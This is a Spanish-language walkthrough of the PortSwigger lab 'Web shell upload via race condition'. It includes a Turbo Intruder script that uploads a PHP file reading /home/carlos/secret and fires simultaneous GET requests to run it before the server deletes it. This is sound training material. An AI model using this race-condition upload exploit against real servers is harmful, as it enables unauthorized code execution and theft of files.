---
id: "web-shell-upload-via-race-condition"
title: "Web shell upload via race condition - PortSwigger Write Up"
author: "juan-antonio-gonzalez-mena"
publishedDate: 2022-02-23
updatedDate: 2024-10-13
image: "https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-0.webp"
description: "Aprende a explotar vulnerabilidades de race condition en la subida de archivos para ejecutar código PHP malicioso antes de que el servidor aplique las validaciones de seguridad."
categories:
  - "portswigger-labs"
draft: false
featured: false
lang: "es"
---

En este post vamos a estar resolviendo el laboratorio de PortSwigger: "Web shell upload via race condition".

![Página de inicio del laboratorio de PortSwigger](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-1.avif)

Para resolver el laboratorio tenemos que subir un archivo PHP que lea y nos muestre el contenido del archivo `/home/carlos/secret`. Ya que para demostrar que hemos completado el laboratorio, deberemos introducir el contenido de este archivo.

Además, el servidor tiene una gran defensa ante la subida de archivos maliciosos, por lo que tendremos que explotar una race condition.

En este caso, el propio laboratorio nos proporciona una cuenta para iniciar sesión, por lo que vamos a hacerlo:

![Formulario de inicio de sesión](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-2.avif)

![Credenciales de acceso proporcionadas](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-3.avif)

Una vez hemos iniciado sesión, nos encontramos con el perfil de la cuenta:

![Perfil de usuario](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-4.avif)

Como podemos ver, tenemos una opción para subir archivos, y concretamente parece ser que se trata de actualizar el avatar del perfil. Vamos a intentar aprovecharnos de esta opción para subir el siguiente archivo PHP:

![Código PHP para leer el archivo secret](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-5.avif)

Antes que nada, vamos a preparar Burp Suite para que intercepte la petición:

![Configuración del proxy en el navegador](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-6.avif)

![Activación de la interceptación en Burp Suite](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-7.avif)

Una vez tenemos Burp Suite listo junto al proxy, seleccionamos el archivo y le damos a "Upload":

![Selección de archivo para subir](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-8.avif)

![Confirmación de archivo seleccionado](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-9.avif)

![Procesando la subida del archivo](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-10.avif)

Aquí Burp Suite interceptará la petición de subida del archivo:

![Petición interceptada en Burp Suite](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-11.avif)

Teniendo la petición, vamos a moverla al repeater para poder ver la respuesta por parte del servidor:

![Respuesta del servidor mostrando restricción](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-12.avif)

Como vemos, nos indica que solo permite archivos JPG y PNG. Además, el laboratorio nos indicaba que hay una gran defensa por parte del servidor, por lo que no tiene pinta que vaya funcionar ninguno de los métodos visto en los otros laboratorios.

En este caso, lo que vamos a explotar es un race condition. Esto, básicamente consiste en que cuando enviamos un archivo que el servidor no permite, cuando lo enviamos, realmente este archivo se sube al servidor, lo que pasa que milisegundos después, el servidor compara el archivo con las sanitizaciones que tenga configuradas, y si no cumple alguna, lo elimina. Pero durante un mini periodo de tiempo, este archivo se mantiene en el servidor subido.

Para explotar esto, vamos a hacer uso de la extensión "Turbo Intruder". La podemos instalar desde el propio Burp Suite:

![Instalación de la extensión Turbo Intruder](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-13.avif)

Una vez instalado, nos vamos a la petición que habíamos interceptado y mandado al repeater y le damos click derecho para mandarlo al turbo intruder:

![Enviar petición a Turbo Intruder](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-14.avif)

Se nos abrirá una pestaña como la siguiente:

![Interfaz de Turbo Intruder](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-15.avif)

Básicamente en la parte superior tenemos nuestra petición, y en la inferior, tenemos por así decirlo la programación de lo que queremos que haga la extensión.

La idea, va a ser usar el siguiente código, por lo que toda la parte inferior del código por defecto, la eliminamos y la sustituimos por lo siguiente:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''<YOUR-POST-REQUEST>'''

    request2 = '''<YOUR-GET-REQUEST>'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

![Código Python para el script de Turbo Intruder](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-16.avif)

La idea es que, la extensión va a hacer la petición POST subiendo el archivo PHP, e inmediatamente, va a realizar 5 peticiones GET a la ruta absoluta de donde se subirá el archivo. De tal forma, que quizás tenemos la suerte de que alguna de esas 5 peticiones GET se hacen entre el momento donde el archivo se ha subido y el momento donde se ha comprobado y eliminado por parte del servidor, en ese mini espacio de tiempo.

Entendiendo, en el código que acabamos de sustituir, vamos a colocar en la variable `request1`, la petición POST completa, y en la variable `request2`, la petición GET completa. Podemos hacer uso del HTTP History para obtener por ejemplo la petición GET:

![HTTP History en Burp Suite](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-17.avif)

La idea, es que el código quede de forma parecida a lo siguiente:

```python
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''
POST /my-account/avatar HTTP/1.1
Host: ac4b1f5f1e3dd03bc0f834b600e0000b.web-security-academy.net
Cookie: session=JNvosgi2FoKxUcKBOL4y07fao7UWjLLG
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------330791307811450659691420606466
Content-Length: 549
Origin: https://ac4b1f5f1e3dd03bc0f834b600e0000b.web-security-academy.net
Dnt: 1
Referer: https://ac4b1f5f1e3dd03bc0f834b600e0000b.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------330791307811450659691420606466
Content-Disposition: form-data; name="avatar"; filename="readSecret.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>

-----------------------------330791307811450659691420606466
Content-Disposition: form-data; name="user"

wiener
-----------------------------330791307811450659691420606466
Content-Disposition: form-data; name="csrf"

eNET4DMt9dleHLPIsCZpUeBUCbDs5JQ2
-----------------------------330791307811450659691420606466--

'''

    request2 = '''
GET /files/avatars/readSecret.php HTTP/1.1
Host: ac4b1f5f1e3dd03bc0f834b600e0000b.web-security-academy.net
Cookie: session=JNvosgi2FoKxUcKBOL4y07fao7UWjLLG
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close

'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

Con esto hecho, empezamos el ataque dándole al botón "Attack" de la parte inferior:

![Botón Attack en Turbo Intruder](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-18.avif)

![Resultados del ataque con Turbo Intruder](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-19.avif)

Se nos abrirá una nueva venta donde veremos las diferentes peticiones, y si nos fijamos de las 5 peticiones GET, 3 han dado error 404, sin embargo, 2 peticiones han dado 200, por lo que estas dos peticiones se han hecho en el mini espacio del que hablábamos antes. Al mismo tiempo, si clickamos en una de ellas, podemos la salida del código PHP interpretado, dicho de otra forma, el contenido del archivo secret.

Con esto, enviamos la solución:

![Formulario para enviar la solución](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-20.avif)

![Confirmación de solución enviada](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-21.avif)

Y de esta forma, completamos el laboratorio:

![Laboratorio completado exitosamente](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-22.avif)

![Mensaje de confirmación final](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-23.avif)

Enlaces de interés:
- [Race Condition - Hacktricks](https://book.hacktricks.xyz/pentesting-web/race-condition)
- [HackerOne Report 759247](https://hackerone.com/reports/759247)
- [HackerOne Report 55140](https://hackerone.com/reports/55140)
- [Race Conditions Exploring the Possibilities](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
